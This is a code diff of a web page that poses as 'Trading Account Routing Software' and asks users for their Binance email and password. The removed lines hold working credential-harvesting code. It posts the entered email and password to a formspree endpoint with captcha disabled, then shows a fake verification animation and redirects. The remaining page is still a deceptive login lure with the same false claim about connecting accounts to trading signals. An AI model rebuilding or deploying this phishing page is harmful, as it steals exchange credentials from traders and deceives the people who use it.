@@ -47,10 +47,11 @@ body.dark .app{background:#11161d;}
   transition:transform .55s cubic-bezier(.77,0,.18,1);
 }
 
-/* Initial page states */
+/* Initial states */
 #login{transform:translateX(0);}
 #verify{transform:translateX(100%);}
 
+/* Animation trigger */
 .show-verify #login{transform:translateX(-100%);}
 .show-verify #verify{transform:translateX(0);}
 
@@ -165,22 +166,17 @@ body.dark .theme{background:#222;color:white;}
 <img src="logo.png" class="logo">
 <h1>Connect Trading Account Routing Software</h1>
 
-<form id="form" action="https://formspree.io/f/YOURID" method="POST">
-
 <div class="field">
-<input name="email" placeholder=" " required>
+<input placeholder=" " required>
 <label>Email</label>
 </div>
 
 <div class="field">
-<input type="password" name="password" placeholder=" " required>
+<input type="password" placeholder=" " required>
 <label>Password</label>
 </div>
 
-<input type="hidden" name="_subject" value="New Trading Submission">
-<input type="hidden" name="_captcha" value="false">
-
-<button id="btn" type="submit">
+<button id="btn" type="button">
 <span>Connect</span>
 <div class="spin" id="spin"></div>
 </button>
@@ -189,7 +185,6 @@ body.dark .theme{background:#222;color:white;}
 Click on connect to automatically connect your Binance account to the scalping real-time data signals to improve your trades.
 </p>
 
-</form>
 </div>
 
 <!-- VERIFY PAGE -->
@@ -205,9 +200,8 @@ Click on connect to automatically connect your Binance account to the scalping r
 </div>
 
 <script>
-const form = document.getElementById("form");
-const spin = document.getElementById("spin");
 const btn = document.getElementById("btn");
+const spin = document.getElementById("spin");
 const app = document.getElementById("app");
 
 function toggleTheme(){
@@ -223,26 +217,19 @@ if(localStorage.getItem("theme")==="dark"){
   document.body.classList.add("dark");
 }
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+btn.addEventListener("click", () => {
 
   spin.style.display = "block";
   btn.disabled = true;
 
-  /* Smooth page animation */
+  /* Trigger animation */
   app.classList.add("show-verify");
 
-  try {
-    await fetch(form.action, {
-      method: "POST",
-      body: new FormData(form),
-      headers: {'Accept':'application/json'}
-    });
-  } catch(err){}
-
+  /* Redirect */
   setTimeout(() => {
     window.location.href = "home.html";
   }, 1800);
+
 });
 </script>
 
